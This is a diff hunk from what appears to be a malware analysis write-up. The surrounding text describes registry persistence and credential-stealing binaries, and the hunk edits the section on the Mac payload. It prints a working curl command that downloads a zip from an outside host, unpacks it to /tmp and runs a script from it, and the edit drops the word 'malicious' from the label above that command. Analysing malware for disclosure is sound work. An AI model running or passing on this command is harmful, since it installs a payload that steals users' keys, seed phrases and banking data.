@@ -183,10 +183,9 @@ I looked at the python code, and they're putting in registry entries to start th
 
 There's a couple compiled binaries in there which is safe to assume are likely looking for anything to get their hands one, e.g. API keys, seed phrases, banking information, etc.
 
-
 ### Mac Payload
 
-The malicious command that gets executed on Mac systems:
+The command that gets executed on Mac systems:
 
 `curl -k -o "/tmp/fixed.zip" "https://auto-ai.online/cam-v-257.fix" && unzip -o "/tmp/fixed.zip" -d "/tmp/fixed" && chmod +x "/tmp/fixed/update.sh" && "/tmp/fixed/update.sh"`
 
